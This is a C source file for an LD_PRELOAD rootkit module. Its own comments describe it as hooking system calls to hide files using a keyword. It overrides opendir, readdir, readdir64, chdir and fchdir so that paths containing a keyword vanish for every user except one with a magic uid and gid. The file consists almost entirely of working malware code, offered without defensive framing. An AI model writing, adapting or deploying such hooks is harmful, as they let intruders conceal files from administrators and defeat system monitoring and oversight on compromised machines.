#define _GNU_SOURCE
/*
*@@@ landy @@@
*Hooks system calls to hide files using a keyword
*
*/
#include "h00k.h"

//directory stuff
DIR *(*old_opendir)(const char *name);
DIR *(*old_opendir64)(const char *name);
struct dirent *(*old_readdir)(DIR *dirp);
struct dirent64 *(*old_readdir64)(DIR *dirp);
int (*old_chdir)(const char *path);
int (*old_fchdir)(int fd);

int ismaster(){

    #ifdef DEBUG
	printf("ismaster called\n");
    #endif

    //TODO find a good way to verify that master is master
    //char *username;
    //username = malloc(256);
    //username = getlogin();

   //if(strcmp(username,permission) == 0){
     //  free(username);
//	return 0;
  //  }

    //free(username);
    
    int myuid = 0; 
    int mygid = 0;
    myuid = getuid();
    mygid = getgid();

    if(myuid == magicuid && mygid == magicgid){
	#ifdef DEBUG
	    printf("ismaster check passed\n");
	#endif

	return 0;
    }

    return 1;
}

//hook the opendir function
DIR *opendir(const char *name){
    
    #ifdef DEBUG
	printf("opendir hooked\n");
    #endif


    if(!old_opendir){
	old_opendir = dlsym(RTLD_NEXT,"opendir");
    }

    if(strstr(name, keyword)){
	if(ismaster() != 0){
	    errno = ENOENT;
	    return NULL;
	}
    }

    return old_opendir(name);
}

DIR *opendir64(const char *name){
    
    #ifdef DEBUG
	printf("opendir64 hooked\n");
    #endif


    if(!old_opendir64){
	old_opendir64 = dlsym(RTLD_NEXT,"opendir64");
    }
   
    if(strstr(name, keyword)){
	if(ismaster() != 0){
	    errno = ENOENT;
	    return NULL;
	}
    }

    return old_opendir64(name);

}

struct dirent *readdir(DIR *dirp){
   
    #ifdef DEBUG
	printf("readdir hooked\n");
    #endif

    struct dirent *dir;
    char path[PATH_MAX + 1];

    if(!old_readdir){
	old_readdir = dlsym(RTLD_NEXT,"readdir");
    }

    if(ismaster() == 0){
	return old_readdir(dirp);	
    }
    
    //honestly so many other ld_preload rootkits use this method
    //and my methods were breaking so fuck it
    do{
	dir = old_readdir(dirp);
	
	if(dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))
	    continue;

	if(dir != NULL){
	    int fd = dirfd(dirp);
	    char fd_path[256];
	    char *dir_name = malloc(256);
	    memset(dir_name, 0, 256);
	    snprintf(fd_path,255,"/proc/self/fd/%d", fd);
	    readlink(fd_path, dir_name, 255);
	    snprintf(path, sizeof(path) - 1, "%s/%s", dir_name, dir->d_name);

	}

    }while(dir && strstr(path, keyword) != 0);

    return dir;

}

struct dirent64 *readdir64(DIR *dirp){
    struct dirent64 *dir;
    char path[PATH_MAX + 1];

    #ifdef DEBUG
	printf("readdir hooked\n");
    #endif


    if(!old_readdir64){
	old_readdir64 = dlsym(RTLD_NEXT,"readdir64");
    }

    if(ismaster() == 0){
	return old_readdir64(dirp);	
    }
    
    //honestly so many other ld_preload rootkits use this method
    //and my methods were breaking so fuck it
    do{
	dir = old_readdir64(dirp);
	
	if(dir != NULL && (strcmp(dir->d_name,".\0") == 0 || strcmp(dir->d_name,"/\0") == 0))
	    continue;
    //yes mom i know why this works
	if(dir != NULL){
	    int fd = dirfd(dirp);
	    char fd_path[256];
	    char *dir_name = malloc(256);
	    memset(dir_name, 0, 256);
	    snprintf(fd_path,255,"/proc/self/fd/%d", fd);
	    readlink(fd_path, dir_name, 255);
	    snprintf(path, sizeof(path) - 1, "%s/%s", dir_name, dir->d_name);

	}

    }while(dir && strstr(path, keyword) != 0);

    return dir;
 
}

int chdir(const char *path){

    #ifdef DEBUG
	printf("chdir hooked\n");
    #endif   

    if(!old_chdir){
	old_chdir = dlsym(RTLD_NEXT,"chdir");
    }

    if(strstr(path, keyword)){
	if(ismaster() != 0){
	    errno = ENOENT;
	    return -1;
	}
    }
    return old_chdir(path);

}

int fchdir(int fd){
    
    #ifdef DEBUG
	printf("fchdir hooked\n");
    #endif

    char fd_path[256];
    char dir[256];
    int pos;

    if(!old_fchdir){
	old_fchdir = dlsym(RTLD_NEXT,"fchdir");
    }

    if(ismaster() == 0)
	return old_fchdir(fd);
    
    //converts the filepointer to a filename
    sprintf(fd_path,"/proc/self/fd/%d", fd);
    pos = readlink(fd_path, dir, 256);
    dir[pos] = '\0';
    
    //now we can check it
    if(strstr(dir,keyword)){
	errno = EIO;
	return -1;
    }

    return old_fchdir(fd);
}



